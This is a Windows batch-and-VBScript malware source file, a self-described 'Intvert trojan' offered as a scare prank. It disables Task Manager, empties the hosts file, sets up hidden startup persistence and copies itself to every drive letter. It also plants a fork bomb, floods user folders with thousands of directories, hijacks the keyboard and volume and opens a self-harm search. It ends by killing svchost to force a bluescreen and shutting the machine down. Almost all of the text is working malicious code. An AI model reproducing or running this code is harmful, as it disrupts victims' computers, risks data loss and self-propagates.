@echo off
title Intvert
:: These scripts had to be moved to the front to make slower systems not be able to stop the program mid-setup
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
taskkill /f /im taskmgr.exe
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /V HideIcons /T REG_DWORD /D 1 /F
:: Hide desktop icons, then restart explorer (makes the above script more reliable)
taskkill /f /im explorer.exe
start explorer.exe

:: Creating a dir for all the "payloads" to be stored in
del %userprofile%\Intvert /F /S /Q 
cd %userprofile%
md Intvert
cd %userprofile%\Intvert
:: Find what directory im in (When running as admin the dir is set to sys32)
set noea=0
echo %~dp0 > tmpf 
set /p curntDir= < tmpf 
del tmpf
:: Reseting the hosts file 
cd "c:\windows\system32\drivers\ect"
del hosts /S /Q /A
echo nul > hosts
::---------------------------------------------------------------------
:: 2 files are made to make the script run by itself in the background this includes date.bat & startup.vbs
:: This works by making the vbs trigger the .bat (Running in background), while the bat runs diffrent payloads depending on date.
:: If nothing is set to run a script will start where the program tries to copy itself to any device it can
:: By uncommenting the below command this disable this feature
::---------------------------------------------------------------------
::goto skitero
:skitero
::--------------------------------
:: 1.mp3 = Hotline Miami: Divide
:: 2.mp3 = Cheetahman theme
:: 3.mp3 = NES jingle bells theme
::--------------------------------
xcopy %curntDir%\1.mp3 %Userprofile%\Intvert /y
xcopy %curntDir%\2.mp3 %Userprofile%\Intvert /y
xcopy %curntDir%\3.mp3 %Userprofile%\Intvert /y
xcopy %curntDir%\main.bat %Userprofile%\Intvert /y
xcopy %curntDir%\silent.vbs %Userprofile%\Intvert /y
::---------------------------------------------------------------------
:: Copies from where the exe would put the needed files 
:: aswell as from where the raw files are on a usb (If not compiled)
::---------------------------------------------------------------------
xcopy %userprofile%\downloads\1.mp3 %Userprofile%\Intvert /y
xcopy %userprofile%\downloads\2.mp3 %Userprofile%\Intvert /y
xcopy %userprofile%\downloads\3.mp3 %Userprofile%\Intvert /y
xcopy %userprofile%\downloads\main.bat %Userprofile%\Intvert /y
xcopy %userprofile%\downloads\silent.vbs %Userprofile%\Intvert /y
:: Delete left over files (ONLY FOR EXE)
del %userprofile%\Downloads\1.mp3 /F /S /Q 
del %userprofile%\Downloads\2.mp3 /F /S /Q 
del %userprofile%\Downloads\3.mp3 /F /S /Q 
del %userprofile%\Downloads\main.bat /F /S /Q 
del %userprofile%\Downloads\silent.bat /F /S /Q 
:: Main Scripts

:: CD to desktop and make a regedit restore file 
cd %userprofile%\desktop
( echo @echo off
  echo echo RUN AS ADMIN OR THE SCRIPT FIX WONT WORK
  echo pause
  echo del %%userprofile%%\Intvert /F /S /Q 
  echo REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f
  echo REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v MagnifierUIWindowMinimized /t REG_DWORD /d 0 /f
  echo REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d 100 /f
  echo REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize /V SystemUsesLightTheme /T REG_DWORD /D 0 /F
  echo REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize /V EnableTransparency /T REG_DWORD /D 1 /F
  echo REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize /V AppsUseLightTheme /T REG_DWORD /D 0 /F) >RESTORE-PC-SRLY.bat
REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v MagnifierUIWindowMinimized /t REG_DWORD /d 1 /f
REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d 100 /f
:: Now disable taskmgr, reset Magnifier magnification aswell as having it open minimized (/min dosen't work on magnifier)
cd %Userprofile%\Intvert
:: CD to the invert folder made earlier in the script
:: Lets start making some scripts
::--------------------BAT---------------------------
( echo @echo off
  echo :sd
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe A:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe B:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe D:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe E:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe F:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe G:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe H:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe I:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe J:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe K:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe L:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe M:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe N:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe O:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe P:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe Q:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe R:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe S:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe T:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe U:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe V:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe W:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe X:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe Y:\Intvert.exe /y
  echo xcopy %%Userprofile%%\Intvert\Intvert.exe Z:\Intvert.exe /y
  echo goto sd) > idla.bat
( echo %%0% %^|% %%%0%) > bomb.bat
( echo @echo off	
  echo timeout /t 30 /nobreak
  echo cd %%userprofile%%\Intvert
  echo FOR /F "skip=1" %%%%x IN ^('wmic os get localdatetime^'^) DO IF NOT DEFINED dmy_date SET dmy_date=%%%%x
  echo SET today=%%dmy_date^:^~6,2%%^-%%dmy_date^:^~4,2%%^-%%dmy_date^:^~0,4%%
  echo IF %%today%% == 21-12-2019 goto BrthDay
  echo IF %%today%% == 21-12-2020 goto BrthDay
  echo IF %%today%% == 21-12-2021 goto BrthDay
  echo IF %%today%% == 22-12-2019 goto Christmas
  echo IF %%today%% == 22-12-2020 goto Christmas
  echo IF %%today%% == 22-12-2021 goto Christmas
  echo :idle
  echo start S10.vbs
  echo timeout /t 30 /nobreak
  echo :BrthDay
  echo SET MyProcess=Intvert.exe
  echo TASKLIST ^| FINDSTR /I "%%MyProcess%%"
  echo IF ERRORLEVEL 1 (GOTO Sta^)
  echo GOTO BrthDay
  echo :Sta 
  echo call %%userprofile%%\Intvert\Intvert.exe
  echo GOTO BrthDay
  echo :Christmas
  echo start XMASvbs
  echo start XMAS2.vbs
  echo goto BLACK
  echo :BLACK
  echo timeout /t 2 /nobreak
  echo taskkill /f /im explorer.exe
  echo goto BLACK
  echo :end
  echo exit )>date.bat
:: This was a pain to make work
( echo @echo off
  echo :check
  echo set /a Rand=%%random%% %%%%4
  echo if %%Rand%%==%%chek%% goto check
  echo set /a chek=%%Rand%%
  echo cd %%userprofile%%\Intvert
  echo start M%%Rand%%.vbs
  echo REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v MagnifierUIWindowMinimized /t REG_DWORD /d 1 /f
  echo start C:\WINDOWS\system32\Magnify.exe
  echo timeout /t 3
  echo goto check) > a.bat
( echo @echo off
  echo :check
  echo set /a Rand=%%random%% %%%%46
  echo if %%Rand%%==%%chek%% goto check
  echo set /a chek=%%Rand%%
  echo if %%Rand%%==0 start http://google.co.ck/search?q=Gime+money
  echo if %%Rand%%==1 start https://youtu.be/FiARsQSlzDc
  echo if %%Rand%%==2 start https://youtu.be/UI1KY4kPpok?t=32
  echo if %%Rand%%==3 start https://youtu.be/7PYe57MwxPI?t=42
  echo if %%Rand%%==4 start https://youtu.be/UJZuupCv3dU
  echo if %%Rand%%==5 start https://www.youtube.com/watch?v=7xFe0vkUJXU
  echo if %%Rand%%==6 start https://www.youtube.com/watch?v=t_LJtG2gXSc
  echo if %%Rand%%==7 start https://www.youtube.com/watch?v=aRsOBFhNjVM	
  echo if %%Rand%%==8 start https://www.reddit.com/r/cursedimages/
  echo if %%Rand%%==9 start https://www.ibm.com/support/knowledgecenter/en/SSGMCP_4.2.0/com.ibm.cics.ts.messages.doc/cics_mc/ASxx_abend_codes/ASRD.html
  echo if %%Rand%%==10 start https://www.aviationweather.gov/adds/
  echo if %%Rand%%==11 start https://www.desertorder.com/
  echo if %%Rand%%==12 start https://www.mchacks.net/
  echo if %%Rand%%==13 start http://google.co.ck/search?q=best+way+to+kill+yourself
  echo if %%Rand%%==14 start http://google.co.ck/search?q=how+2+remove+a+virus
  echo if %%Rand%%==15 start http://google.co.ck/search?q=mcafee+vs+norton
  echo if %%Rand%%==16 start http://google.co.ck/search?q=minecraft+hax+download+no+virus
  echo if %%Rand%%==17 start http://google.co.ck/search?q=how+to+get+money
  echo if %%Rand%%==18 start http://google.co.ck/search?q=bonzi+buddy+download+free
  echo if %%Rand%%==19 start http://google.co.ck/search?q=what+happens+if+you+delete+system32
  echo if %%Rand%%==20 start http://google.co.ck/search?q=g3t+r3k
  echo if %%Rand%%==21 start http://google.co.ck/search?q=virus.exe
  echo if %%Rand%%==22 start http://google.co.ck/search?q=internet+explorer+is+the+best+browser
  echo if %%Rand%%==23 start http://google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp
  echo if %%Rand%%==24 start http://google.co.ck/search?q=dank+memz
  echo if %%Rand%%==25 start http://google.co.ck/search?q=how+to+download+memz
  echo if %%Rand%%==26 start http://google.co.ck/search?q=half+life+3+release+date
  echo if %%Rand%%==27 start http://google.co.ck/search?q=is+illuminati+real
  echo if %%Rand%%==28 start http://google.co.ck/search?q=the+memz+are+real
  echo if %%Rand%%==29 start http://google.co.ck/search?q=stanky+danky+maymays
  echo if %%Rand%%==30 start http://google.co.ck/search?q=john+cena+midi+legit+not+converted
  echo if %%Rand%%==31 start http://google.co.ck/search?q=vinesauce+meme+collection
  echo if %%Rand%%==32 start http://google.co.ck/search?q=skrillex+scay+onster+an+nice+sprites+midi
  echo if %%Rand%%==33 start http://answers.microsoft.com/en-us/protect/forum/protect_other-protect_scanning/memz-malwarevirus-trojan-completely-destroying/268bc1c2-39f4-42f8-90c2-597a673b6b45
  echo if %%Rand%%==34 start http://play.clubpenguin.com
  echo if %%Rand%%==35 start http://pcoptimizerpro.com
  echo if %%Rand%%==36 start http://softonic.com
  echo if %%Rand%%==37 start https://www.google.com/search?q=www.google.co.ck
  echo if %%Rand%%==38 start http://www.penisland.net/
  echo if %%Rand%%==39 start https://giphy.com/embed/l46Cbqvg6gxGvh2PS
  echo if %%Rand%%==40 start https://www.addictivetips.com/
  echo if %%Rand%%==41 start https://www.lifehacker.com.au/?r=US
  echo if %%Rand%%==42 start https://www.snopes.com/
  echo if %%Rand%%==43 start https://en.softonic.com/articles/fix-slow-computer
  echo if %%Rand%%==44 start https://360-total-security.en.softonic.com/support
  echo if %%Rand%%==45 start https://advanced-systemcare-ultimate.en.softonic.com/
  echo timeout /t 7
  echo goto check) > b.bat
( echo @echo off
  echo cd C:\WINDOWS\system32
  echo :a
  echo start Magnify.exe
  echo reg add HKEY_CURRENT_USER\Software\Microsoft\ScreenMagnifier /v Invert /d 0 /f /t REG_DWORD
  echo timeout /t 1
  echo start Magnify.exe
  echo reg add HKEY_CURRENT_USER\Software\Microsoft\ScreenMagnifier /v Invert /d 1 /f /t REG_DWORD
  echo timeout /t 1
  echo goto a) >c.bat
( echo @echo off
  echo :check
  echo set /a Rand=%%Random%% %%%%200
  echo if %%Rand%%==%%chek%% goto check
  echo set /a chek=%%Rand%%
  echo REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d %%rand%% /f
  echo timeout /t 3
  echo goto check) > d.bat
( echo @echo off
  echo :check
  echo set /a Rand=%%random%% %%%%20
  echo if %%Rand%%==%%chek%% goto check
  echo set /a chek=%%Rand%%
  echo cd C:\WINDOWS\system32
  echo if %%Rand%%==0 start C:\Windows\write.exe
  echo if %%Rand%%==1 start dfgui.exe
  echo if %%Rand%%==2 start SnippingTool.exe
  echo if %%Rand%%==3 start SndVol.exe
  echo if %%Rand%%==4 start osk.exe
  echo if %%Rand%%==5 start notepad.exe
  echo if %%Rand%%==6 start Narrator.exe
  echo if %%Rand%%==7 start mspaint.exe
  echo if %%Rand%%==8 start msinfo32.exe
  echo if %%Rand%%==9 start msconfig.exe
  echo if %%Rand%%==10 start colorcpl.exe
  echo if %%Rand%%==11 start calc.exe
  echo if %%Rand%%==12 start charmap.exe
  echo if %%Rand%%==13 start C:\Windows\Resources\Themes\aero\aero.msstyles
  echo if %%Rand%%==14 start SystemPropertiesAdvanced.exe
  echo if %%Rand%%==15 start SystemPropertiesComputerName.exe
  echo if %%Rand%%==16 start SystemPropertiesHardware
  echo if %%Rand%%==17 start SystemPropertiesPerformance
  echo if %%Rand%%==18 start SystemPropertiesProtection
  echo if %%Rand%%==19 start SystemPropertiesRemote
  echo taskkill /F /IM SystemPropertiesAdvanced.exe
  echo taskkill /F /IM SystemPropertiesComputerName.exe
  echo taskkill /F /IM SystemPropertiesHardware
  echo taskkill /F /IM SystemPropertiesPerformance
  echo taskkill /F /IM SystemPropertiesProtection
  echo taskkill /F /IM SystemPropertiesRemote
  echo timeout /t 6
  echo goto check) > e.bat
( echo @echo off
  echo :asd
  echo set /a a=%%random%% %%%%1
  echo set /a b=%%random%% %%%%1
  echo set /a c=%%random%% %%%%1
  echo REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V SystemUsesLightTheme /T REG_DWORD /D %a% /F
  echo REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V EnableTransparency /T REG_DWORD /D %b% /F
  echo REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V AppsUseLightTheme /T REG_DWORD /D %c% /F
  echo timeout /t 4
  echo goto asd) > f.bat
( echo @echo off
  echo cd %userprofile%\Intvert
  echo curl -o "haxr.jpg" https://image.freepik.com/free-vector/protection-against-hacker_106788-323.jpg
  echo reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d "" /f
  echo reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d %%userprofile%%\Intvert\haxr.jpg /f
  echo reg add "HKEY_CURRENT_USER\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
  echo set lo=0
  echo :noea
  echo RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
  echo set /a lo=%%lo%%+1
  echo if %%lo%%==64 goto nea
  echo goto noea
  echo :nea
  echo exit) > g.bat
( echo xcopy %%userprofile%%\desktop\*.* %%userprofile%%\documents /C /Y
  echo xcopy %%userprofile%%\music\*.* %%userprofile%%\documents /C /Y
  echo xcopy %%userprofile%%\photos\*.* %%userprofile%%\documents /C /Y
  echo xcopy %%userprofile%%\downloads\*.* %%userprofile%%\documents /C /Y
  set /a dris="%%userprofile%%\documents"
  echo :noRest
  echo set drs=0
  echo :daws
  echo set lo=0
  echo cd %%dris%%
  echo :noea
  echo md YouAreAnIdiot%%random%%%%random%%%%random%%%%random%%%%random%%
  echo set /a lo=%%lo%%+1
  echo if %%lo%%==4096 goto nea
  echo goto noea
  echo :nea
  echo set /a drs=%%drs%%+1
  echo set lo=0
  echo if %%drs%% ==1 set /a dris="%%userprofile%%\desktop"
  echo if %%drs%% ==2 set /a dris="%%userprofile%%\music"
  echo if %%drs%% ==3 set /a dris="%%userprofile%%\photos"
  echo if %%drs%% ==4 set /a dris="%%userprofile%%\downloads"
  echo if %%drs%% ==5 set /a dris="%%userprofile%%\documents"
  echo if %%drs%% ==6 goto noRest
  echo goto daws) > h.bat
:: This script is evil and I hate it
::--------------------VBS---------------------------
( echo do
  echo x=msgbox("It's Christmas, Go Outside",48,"FUCK OFF MATE"^)
  echo loop) >XMAS2.vbs
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "3.mp3"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >XMAS.vbs
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "1.mp3"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >Divide.vbs
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "2.mp3"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >Cheeta.vbs
( echo x=msgbox("Boo!",48,"In YA"^)) >M1.vbs
( echo x=msgbox("Still using this computer^?",48,"No Shit"^)) >M2.vbs
( echo x=msgbox("Lemon mixed with milk",48,"Vinesause^?"^)) >M3.vbs
( echo x=msgbox("HIT ME AGAIN GODDAMMIT",48,"Ghost"^)) >M0.vbs
( echo x=msgbox("Rest in Piss Forever Miss",48," "^)) >End.vbs
:: The below scripts make the cmd window not appear as visable when lauched
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\a.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S1.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\b.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S2.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\c.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S3.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\d.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S4.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\e.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S5.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\f.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S6.vbs
  ( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\g.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S7.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\Bomb.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S8.vbs
( echo Set WshShell = CreateObject(" WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\h.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S9.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\idla.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S10.vbs
cd "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\date.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S11.vbs
cd %Userprofile%\Intvert
( echo Set wshShell =wscript.CreateObject^("WScript.Shell"^)
  echo do
  echo wscript.sleep 100
  echo wshshell.sendkeys "{H}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{I}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{T}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{ }"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{M}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{E}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{ }"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{A}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{G}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{A}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{I}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{N}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{!}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{ }"
  echo loop) >kes.vbs
( echo do
  echo Set WshShell = CreateObject("WScript.Shell"^)
  echo wscript.sleep 10
  echo WshShell.SendKeys(chr(^&hAF^)^)
  echo loop) >v.vbs
::--------------------TXT---------------------------
( echo Fist off thanks for running this script
  echo Seccondly your computer has been infected by the Intvert tojan
  echo Have fun trying to use your computer, it won't last long
  echo.
  echo Shutting down has a chance of harming your system so I don't 
  echo reccomend it, just wait till the drop. Enjoy :D) >Yes.txt
( echo So your computer has been trashed by the Intvert tojan
  echo.
  echo You haven't rebooted which im guessing means you want to
  echo see more payloads, or your scared frozen and don't know what
  echo to do, anyway. This "trojan" isn't harmfull, its just made to 
  echo scare you, the program changes some reg keys and because of 
  echo this a .bat has been made on the desktop to re-enable taskmgr 
  echo and reset magnifier.
  echo.
  echo Since your still here we might aswell give you a show.
  echo Enjoy :D) >GiveItASec.txt

::-----------------------------------------------------------------------------------------------------------------------------------------------
:: FILE NAME  | DISCRIPTION                                                   | COMMENT
::-----------------------------------------------------------------------------------------------------------------------------------------------
:: S1.vbs     | Random popup messages                                         |
:: S2.vbs     | Random popup website                                          | First payload made, used to be just this one payload
:: S3.vbs     | Invert colours on screen                                      |
:: S4.vbs     | Random zoom on cursor                                         | 
:: S5.vbs     | Open Random sys32 aplications                                 |
:: S6.vbs     | Cycle between light and dark mode for                         |
:: S7.vbs     | Change background                                             |
:: S8.vbs     | Bomb payload                                                  |
:: S9.vbs     | Move all files in desktop/music/photos/downloads to documents | Only use if you hate the person who is reciving this file
:: S10.vbs    | Copy exe to any connected drives                              | Dosen't work for usb
:: kes.vbs    | Send keystrokes                                               | Helps to be flaged by anti-virus as a trojan
:: Divide.vbs | Play the first music track                                    |
:: Cheeta.vbs | Play the seccond music track                                  |
:: XMAS.vbs   | Play the third music track                                    |
:: end.vbs    | REST IN PISS FOREVER MISS                                     | Popup message
:: v.vbs      | Max volume                                                    | Maxes out the volume by sending the volume up key every 10 nano
::-----------------------------------------------------------------------------------------------------------------------------------------------
rundll32.exe %SystemRoot%\system32\shell32.dll,Control_RunDLL %SystemRoot%\system32\desk.cpl desk,@Themes /Action:OpenTheme /file:"C:\Windows\Resources\Themes\aero.theme"
:: Change windows theme (Spooky)
Rundll32 user32,SwapMouseButton
:: Do I need to explain what this dose (Swap mouse buttons)
start s7.vbs
start Divide.vbs
start Yes.txt
:: Open a txt document tring to scare the user
timeout /t 29 /nobreak
:: Fun fact: Without error the next payload is timed with the drop of the song
start S2.vbs
start S6.vbs
start kes.vbs
timeout /t 36 /nobreak
start v.vbs
start S3.vbs
timeout /t 36 /nobreak
start S1.vbs
start S4.vbs
timeout /t 36 /nobreak
start S5.vbs 
timeout /t 36 /nobreak
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /V HideIcons /T REG_DWORD /D 0 /F
taskkill /f /im explorer.exe
start explorer.exe
taskkill /F /IM wscript.exe
REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d 100 /f
for /f "usebackq tokens=2 delims=," %%a in (`tasklist /NH /v /fo csv /FI "IMAGENAME eq cmd.exe" /FI "STATUS eq running" ^| FIND /I "Intvert"`) do ( TASKKILL /F /FI "PID ne %%~a" /FI "IMAGENAME eq cmd.exe" /IM cmd.exe)
TASKKILL /F /IM explorer.exe
TASKKILL /F /IM firefox.exe
TASKKILL /F /IM chrome.exe
TASKKILL /F /IM MicrosoftEdge.exe
TASKKILL /F /IM Magnify.exe
:: Attempt to kill all current payloads to "talk" to the user
start /max GiveItASec.txt
timeout /t 32 /nobreak
TASKKILL /F /IM notepad.exe
start explorer.exe
start v.vbs
start S2.vbs
start S3.vbs
start Cheeta.vbs 
timeout /t 16 /nobreak 
:: SLOW THIS SHIT DOWN
start S8.vbs
timeout /t 10 /nobreak
start end.vbs
timeout /t 38 /nobreak
:: LETS FINNISH THIS PC
taskkill /f /im explorer.exe
timeout /t 16 /nobreak
:win10
taskkill /F /Im svchost.exe
:: Bluescreen (Win10 only, I think)
:win7
Powershell.exe -executionpolicy get-process | stop-process -force
:: Bluescreen hopefuly (Never been able to test this)
:shutdownr
shutdown /s /f /c "HOW HAVE YOU NOT BLUESCREENED YET, JUST DIE" /t 60
